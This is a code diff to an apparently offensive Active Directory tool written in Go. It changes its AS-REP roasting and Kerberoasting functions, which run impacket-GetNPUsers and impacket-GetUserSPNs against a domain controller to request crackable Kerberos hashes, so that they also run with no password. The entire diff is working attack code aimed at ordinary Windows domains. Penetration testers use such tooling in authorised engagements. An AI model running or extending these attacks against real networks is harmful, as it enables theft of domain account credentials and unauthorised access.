@@ -46,11 +46,19 @@ func RunKerberos(state *core.ADState, targetHost string) *core.ToolResult {
 func runASREPRoast(domain, user, pass, target string) *core.ToolResult {
 	result := &core.ToolResult{Success: true}
 	fmt.Printf("[*] AS-REP roasting against %s...\n", target)
-	args := []string{fmt.Sprintf("%s/%s:%s", domain, user, pass)}
+	authStr := fmt.Sprintf("%s/%s:%s", domain, user, pass)
+	// Impacket-GetNPUsers with -no-pass: query for all users without preauth
+	if pass == "" {
+		authStr = fmt.Sprintf("%s/%s", domain, user)
+	}
+	args := []string{authStr}
 	if target != "" {
 		args = append(args, "-dc-ip", target)
 	}
 	args = append(args, "-request")
+	if pass == "" {
+		args = append(args, "-no-pass")
+	}
 
 	r := utils.RunCommand("impacket-GetNPUsers", args...)
 	if !r.Success {
@@ -89,11 +97,18 @@ func runASREPRoast(domain, user, pass, target string) *core.ToolResult {
 func runKerberoast(domain, user, pass, target string) *core.ToolResult {
 	result := &core.ToolResult{Success: true}
 	fmt.Printf("[*] Kerberoasting against %s...\n", target)
-	args := []string{fmt.Sprintf("%s/%s:%s", domain, user, pass)}
+	authStr := fmt.Sprintf("%s/%s:%s", domain, user, pass)
+	if pass == "" {
+		authStr = fmt.Sprintf("%s/%s", domain, user)
+	}
+	args := []string{authStr}
 	if target != "" {
 		args = append(args, "-dc-ip", target)
 	}
 	args = append(args, "-request")
+	if pass == "" {
+		args = append(args, "-no-pass")
+	}
 
 	r := utils.RunCommand("impacket-GetUserSPNs", args...)
 	if !r.Success {
